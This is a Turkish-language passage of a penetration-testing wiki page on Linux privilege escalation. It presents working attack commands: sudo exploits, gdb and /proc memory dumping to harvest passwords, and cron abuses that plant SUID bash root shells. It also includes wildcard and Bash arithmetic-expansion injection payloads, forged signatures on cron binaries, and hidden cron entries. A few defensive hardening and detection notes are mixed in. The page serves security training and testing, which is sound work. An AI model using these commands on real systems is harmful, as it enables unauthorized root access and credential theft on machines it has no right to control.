# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Daha kapsamlı arka plan ve geçmiş enumeration iş akışları için references bölümünde listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını karşılaştırın.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## System Information

### OS info

Çalışan OS hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` değişkenindeki herhangi bir klasör için **yazma izinleriniz varsa** bazı kütüphaneleri veya binary'leri ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgileri

Environment değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploitleri

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını belirleyin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve önceden **compiled exploits** dosyalarını burada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Bazı **compiled exploits** dosyalarını bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesindeki tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırılır, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; kernel sürümünüz bazı kernel exploitlerinde yazıyor olabilir. Böylece bu exploitin geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Ayrıcalık Yükseltme - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Şurada belirtilen savunmasız sudo sürümlerine göre:
```bash
searchsploit sudo
```
Bu grep komutunu kullanarak sudo sürümünün güvenlik açığı içerip içermediğini kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 öncesindeki Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**), `/etc/nsswitch.conf` dosyası kullanıcı tarafından kontrol edilen bir dizinden kullanıldığında, ayrıcalıksız yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root seviyesine yükseltmesine olanak tanır.<sup>[[28]](#references)[[29]](#references)</sup>

İşte bu [zafiyeti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot). Exploit'i çalıştırmadan önce `sudo` sürümünüzün vulnerable olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [zafiyet duyurusuna](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) başvurun.<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 öncesindeki Sudo sürümleri (bildirilen etkilenen aralık: **1.8.8–1.9.17**), host-based sudoers rules değerlendirilirken gerçek hostname yerine `sudo -h <host>` komutuyla kullanıcı tarafından sağlanan hostname'i kullanabilir. sudoers başka bir host üzerinde daha geniş ayrıcalıklar veriyorsa, bu host'u yerel olarak **spoof** edebilirsiniz.<sup>[[29]](#references)</sup>

Gereksinimler:
- Vulnerable sudo sürümü
- Host-specific sudoers rules (host, mevcut hostname veya `ALL` değil)

Örnek sudoers pattern'i:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
İzin verilen host'u spoof ederek exploit et:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Sahte adın çözümlenmesi engelleniyorsa, DNS aramalarını önlemek için adı `/etc/hosts` dosyasına ekleyin veya günlüklerde/yapılandırmalarda zaten görünen bir hostname kullanın.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu vuln'un nasıl exploit edilebileceğine dair bir **example** için **HTB'nin smasher2 box**'ını inceleyin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleme

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

If you are inside a container, start with the following container-security section and then pivot into the runtime-specific abuse pages:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diskler

**Nelerin mount ve unmount edildiğini**, nerede ve neden yapıldığını kontrol edin. Eğer herhangi bir şey unmount edilmişse onu mount etmeyi ve private info olup olmadığını kontrol etmeyi deneyebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Yararlı binary'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin kurulu olup olmadığını kontrol edin**. Bazı kernel exploit'lerini kullanmanız gerekirse bu faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Güvenlik Açığı Bulunan Yazılımlar

**Kurulu paketlerin ve servislerin sürümünü** kontrol edin. Örneğin, ayrıcalıkları yükseltmek için exploit edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli kurulu yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, makinenin içinde yüklü olan güncel olmayan ve güvenlik açığı içeren yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla kullanışsız olacak çok fazla bilgi göstereceğini unutmayın. Bu nedenle, yüklü yazılım sürümlerinden herhangi birinin bilinen exploit'lere karşı savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri bazı uygulamaların kullanılması önerilir_

## Süreçler

Yürütülen **process'lere** göz atın ve herhangi bir process'in **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin root tarafından yürütülen bir tomcat olabilir mi?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman olası [**electron/cef/chromium debuggers** çalışan süreçleri](../../software-information/electron-cef-chromium-debugger-abuse.md) kontrol edin; ayrıcalıkları yükseltmek için bunları abuse edebilirsiniz. **Linpeas**, sürecin command line'ı içindeki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreç binary'leri üzerindeki ayrıcalıklarınızı** kontrol edin; belki başka bir kullanıcının binary'sini overwrite edebilirsiniz.

### Kullanıcılar arası parent-child chain'leri

**Farklı bir kullanıcı** altında çalışan bir child process, parent'ına göre otomatik olarak malicious değildir; ancak yararlı bir **triage sinyali**dir. Bazı geçişler beklenen davranışlardır (`root` bir service user başlatır, login manager'lar session process'leri oluşturur), ancak alışılmadık chain'ler wrapper'ları, debug helper'larını, persistence'ı veya zayıf runtime trust boundary'lerini ortaya çıkarabilir.

Hızlı inceleme:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Beklenmedik bir zincir bulursanız üst süreç komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı script'ler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının birçoğunda child'ın kendisi yazılabilir değildi; ancak **parent-controlled config** veya yardımcı zinciri yazılabilirdi.

### Silinen executable'lar ve silinmiş-açık dosyalar

Runtime artifact'leri, **silindikten sonra bile** çoğu zaman erişilebilir durumdadır. Bu, hem privilege escalation hem de hassas dosyaları hâlihazırda açık tutan bir process'ten kanıt kurtarmak için kullanışlıdır.

Silinen executable'ları kontrol edin:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` `(deleted)` değerini gösteriyorsa işlem hâlâ eski binary image'ını bellekten çalıştırıyor demektir. Bu, araştırılması gereken güçlü bir sinyaldir çünkü:

- kaldırılan executable ilginç string'ler veya kimlik bilgileri içerebilir
- çalışan işlem hâlâ faydalı file descriptor'ları açığa çıkarabilir
- silinmiş bir privileged binary, yakın zamanda yapılmış tampering veya cleanup girişimine işaret edebilir

Silinmiş ve açık dosyaları global olarak toplayın:
```bash
lsof +L1
```
İlginç bir descriptor bulursanız, onu doğrudan kurtarın:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Bu, bir process'in hâlâ silinmiş bir secret'ı, script'i, database export'unu veya flag file'ını açık tutması durumunda özellikle değerlidir.

### Process monitoring

Process'leri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık sık çalıştırılan veya bir dizi gereksinim karşılandığında çalıştırılan vulnerable process'leri tespit etmek için oldukça yararlı olabilir.

### Process memory

Bir server'ın bazı servisleri **credentials'ları memory içinde clear text olarak saklar**.\
Normalde başka kullanıcılara ait process'lerin memory'sini okumak için **root privileges** gerekir; bu nedenle bu işlem genellikle zaten root olduğunuzda daha fazla credential keşfetmek istediğinizde daha kullanışlıdır.\
Ancak, **regular user olarak sahibi olduğunuz process'lerin memory'sini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu machine'in **ptrace'e default olarak izin vermediğini** unutmayın; bu, unprivileged user'ınıza ait diğer process'leri dump edemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ file'ı ptrace'in erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid'e sahip oldukları sürece tüm process'ler debug edilebilir. ptracing'in klasik çalışma şekli budur.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: ptrace'i yalnızca admin kullanabilir; bunun için CAP_SYS_PTRACE capability'si gerekir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir process ptrace ile trace edilemez. Bu ayarlandıktan sonra ptracing'i yeniden etkinleştirmek için reboot gerekir.

#### GDB

Bir FTP service'in memory'sine erişiminiz varsa (örneğin), Heap'i elde edebilir ve credentials'larını arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için **maps, belleğin o işlemin sanal adres alanı içinde nasıl eşlendiğini gösterir**; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** pseudo dosyası, **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve ofsetlerini öğreniriz. Bu bilgiyi kullanarak **mem dosyasında ilgili konuma seek işlemi uygulayıp okunabilir tüm bölgeleri** bir dosyaya dökeriz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`, sanal belleğe değil, sistemin **fiziksel** belleğine erişim sağlar. Kernel'ın sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış hâlidir. Aracı [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process memory dump'ı almak için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait process'in dump'ını alabilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) içindeki Script A.5 (root gereklidir)

### Process Memory'den Credentials

#### Manuel örnek

Authenticator process'inin çalıştığını tespit ederseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilir (bir process'in memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten açık metin kimlik bilgilerini** ve bazı **bilinen dosyalardan** kimlik bilgilerini **çalabilir**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                            | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex arama/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) root olarak çalışıyor – web tabanlı scheduler privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH local port-forwarding aracılığıyla yine de erişebilir ve privilege escalation gerçekleştirmek için privileged bir job oluşturabilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Loopback-only portunu (ör. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Kimlik bilgilerini operational artifact'larda bulun:
- `zip -P <password>` içeren backup/script'ler
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit'i
- Tunnel oluşturun ve login olun:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluşturun ve hemen çalıştırın (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcıyla ve minimum izinlerle sınırlandırın
- localhost'a bind edin ve erişimi ayrıca firewall/VPN üzerinden kısıtlayın; parolaları yeniden kullanmayın
- Secret'ları unit file'lara gömmekten kaçının; secret store'lar veya yalnızca root'un okuyabildiği EnvironmentFile kullanın
- İsteğe bağlı job çalıştırmaları için audit/logging'i etkinleştirin

Herhangi bir scheduled job'ın vulnerable olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root'un kullandığı directory içinde belirli dosyalar oluşturabilir misiniz?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Bu, false positive'ları önler. Yazılabilir bir periyodik dizin yalnızca payload dosyanızın adı yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma yetkisine sahip olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı path'i belirtmeden bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Şunu kullanarak bir root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Wildcard kullanan bir script ile Cron (Wildcard Injection)

Bir script root tarafından çalıştırılıyorsa ve bir komutun içinde “**\***” bulunuyorsa, beklenmedik şeyler (örneğin privesc) gerçekleştirmek için bundan faydalanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wildcard'ın _**/some/path/\***_ **gibi bir path ile başlaması durumunda savunmasız değildir (hatta** _**./\***_ **bile savunmasız değildir).**

Daha fazla wildcard exploitation trick'i için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log parser'larında Bash arithmetic expansion injection

Bash, ((...)), $((...)) ve let içindeki arithmetic evaluation işleminden önce parameter expansion ve command substitution gerçekleştirir. Root cron/parser güvenilmeyen log alanlarını okur ve bunları bir arithmetic context'e aktarırsa saldırgan, cron çalıştığında root olarak çalışacak bir command substitution $(...) enjekte edebilir.<sup>[[22]](#references)</sup>

- Neden çalışır: Bash'te expansion işlemleri şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu nedenle `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (command çalıştırılır), ardından kalan numeric `0` arithmetic işleminde kullanılır; böylece script errors olmadan devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log'a attacker-controlled text yazılmasını sağlayın; numeric-looking field bir command substitution içersin ve bir digit ile bitsin. Arithmetic işleminin geçerli kalması için command'in stdout'a çıktı vermediğinden (veya çıktıyı redirect ettiğinizden) emin olun.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Root tarafından çalıştırılan bir cron script'ini **modify edebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizini** kullanıyorsa, bu klasörü silip **sizin kontrolünüzdeki bir scripti sunan başka bir dizine sembolik bağlantı oluşturan bir klasörle** değiştirmek faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işleme

Yollar aracılığıyla dosya okuyan veya dosyalara yazan ayrıcalıklı script/binary'leri incelerken bağlantıların nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin metadata bilgilerini döndürür.
- `lstat()` bağlantının kendisine ait metadata bilgilerini döndürür.
- `readlink -f` ve `namei -l`, nihai hedefi çözümlemeye ve her yol bileşeninin izinlerini göstermeye yardımcı olur.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Savunmacılar/geliştiriciler için symlink hilelerine karşı daha güvenli yaklaşımlar şunlardır:

- `O_EXCL` ile `O_CREAT`: yol zaten mevcutsa işlemi başarısız kılar (saldırgan tarafından önceden oluşturulmuş linkleri/dosyaları engeller).
- `openat()`: güvenilir bir dizin file descriptor'ına göreli olarak işlem yapar.
- `mkstemp()`: güvenli izinlerle geçici dosyaları atomik olarak oluşturur.

### Yazılabilir payload'lara sahip özel imzalı cron binary'leri

Blue team'ler bazen cron tarafından çalıştırılan binary'leri, özel bir ELF section'ını dışarı aktarıp vendor string için grep yaparak ve ardından bunları root olarak çalıştırarak "imzalar". Bu binary group tarafından yazılabilirse (ör. `root:devs 770` sahibi `/opt/AV/periodic-checks/monitor`) ve signing material'i leak edebilirseniz, section'ı sahteleyip cron görevini ele geçirebilirsiniz:<sup>[[2]](#references)</sup>

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era'da root, `objcopy --dump-section .text_sig=text_sig_section.bin monitor` komutunu çalıştırdı; ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` komutunu çalıştırdı ve dosyayı yürüttü.
2. Leak edilen key/config'i (`signing.zip` içinden) kullanarak beklenen sertifikayı yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir replacement oluşturun (ör. bir SUID bash bırakın veya SSH key'inizi ekleyin) ve grep'in başarılı olması için sertifikayı `.text_sig` içine gömün:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Execute bit'lerini koruyarak schedule edilmiş binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit signature check başarılı olduğunda payload'unuz root olarak çalışır.

### Sık cron görevleri

Her 1, 2 veya 5 dakikada bir çalıştırılan process'leri aramak için process'leri izleyebilirsiniz. Belki bundan yararlanıp privilege escalation gerçekleştirebilirsiniz.

Örneğin **1 dakika boyunca her 0.1 saniyede bir izlemek**, **daha az çalıştırılan command'lere göre sıralamak** ve en çok çalıştırılan command'leri silmek için şunu çalıştırabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Şunları da kullanabilirsiniz:** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu araç başlayan her process'i izler ve listeler).

### Saldırgan tarafından ayarlanan mode bit'lerini koruyan root backup'ları (pg_basebackup)

Root-owned bir cron, yazabildiğiniz bir database directory üzerinde `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, **SUID/SGID binary** yerleştirerek bunun backup output'una aynı mode bit'leriyle **root:root** olarak yeniden kopyalanmasını sağlayabilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük yetkili bir DB user olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` benzeri bir komut çalıştıran root cron'u tespit etmek için `pspy` kullanın.
- Source cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve job sonrasında destination'ın (`/opt/backups/current`) root tarafından sahiplenildiğini doğrulayın.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` cluster'ı kopyalarken dosya mod bitlerini koruduğu için çalışır; root tarafından çalıştırıldığında hedef dosyalar **root sahipliği + saldırgan tarafından seçilen SUID/SGID** değerlerini devralır. İzinleri koruyan ve çalıştırılabilir bir konuma yazan benzer herhangi bir ayrıcalıklı backup/copy rutini savunmasızdır.

### Görünmez cron işleri

**Yeni satır karakteri olmadan**, bir yorumun arkasına **carriage return** ekleyerek bir cronjob oluşturmak mümkündür ve cron işi çalışır. Örnek (carriage return karakterine dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Bu tür bir gizli girişi tespit etmek için cron dosyalarını kontrol karakterlerini gösteren araçlarla inceleyin:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Hizmetler

### Yazılabilir _.service_ dosyaları

